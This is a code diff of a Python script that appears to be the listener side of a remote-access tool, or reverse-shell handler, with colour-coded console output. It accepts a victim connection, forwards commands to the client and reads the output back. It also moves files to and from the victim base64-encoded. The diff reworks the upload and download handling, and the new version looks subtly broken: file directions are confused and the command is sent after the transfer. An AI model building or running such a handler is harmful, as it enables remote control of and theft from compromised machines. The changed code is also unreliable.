@@ -1,8 +1,8 @@
 import socket
 from colorama import Fore, Style, init
-import json
-import base64
 import os
+import base64
+import json
 
 # Initialize colorama
 init(autoreset=True)
@@ -24,27 +24,32 @@ print(Fore.YELLOW + f"Server listening on {Fore.CYAN}{HOST}:{PORT}")
 client_socket, client_address = server.accept()
 print(Fore.GREEN + f"Connection established with {client_address}")
 
-def send_json(conn, data):
-    json_data = json.dumps(data)
-    conn.send(json_data.encode())
 
-def receive_json(conn):
+def send_json(data):
+    json_data = json.dumps(data)
+    client_socket.send(json_data.encode())
+
+
+def receive_json():
     json_data = ""
     while True:
         try:
-            json_data = json_data + conn.recv(1024).decode()
+            json_data += client_socket.recv(1024).decode()
             return json.loads(json_data)
         except ValueError:
             continue
 
-def write_file(path, content):
-    with open(path, "wb") as file:
-        file.write(base64.b64decode(content))
-        return "[+] Download successful [+]"
 
 def read_file(path):
     with open(path, "rb") as file:
         return base64.b64encode(file.read()).decode()
+
+
+def write_file(path, content):
+    with open(path, "wb") as file:
+        file.write(base64.b64decode(content))
+        return "[+] Upload successful [+]"
+
 
 try:
     while True:
@@ -55,6 +60,24 @@ try:
         # Get user input
         command = input()
 
+        # Handle upload or download commands
+        if command.startswith("download"):
+            _, file_path = command.split(" ", 1)
+            try:
+                file_content = read_file(file_path)
+                send_json(file_content)
+                print(Fore.GREEN + f"File {file_path} sent successfully.")
+            except Exception as e:
+                send_json(f"Error: {e}")
+        elif command.startswith("upload"):
+            _, file_path = command.split(" ", 1)
+            content = receive_json()
+            try:
+                write_file(file_path, content)
+                print(Fore.GREEN + f"File {file_path} uploaded successfully.")
+            except Exception as e:
+                print(Fore.RED + f"Error: {e}")
+
         # Send the command to the client
         client_socket.sendall(command.encode("utf-8"))
 
@@ -62,22 +85,6 @@ try:
             print(Fore.RED + "Disconnecting from client...")
             client_socket.close()
             break
-
-        # Handle upload and download commands
-        if command.startswith("upload"):
-            path = command.split(" ")[1]
-            file_content = read_file(path)
-            send_json(client_socket, ["upload", path, file_content])
-            response = receive_json(client_socket)
-            print(Fore.WHITE + response)
-            continue
-        elif command.startswith("download"):
-            path = command.split(" ")[1]
-            send_json(client_socket, ["download", path])
-            file_content = receive_json(client_socket)
-            response = write_file(path, file_content)
-            print(Fore.WHITE + response)
-            continue
 
         # Receive the output from the client
         output = client_socket.recv(4096).decode("utf-8")
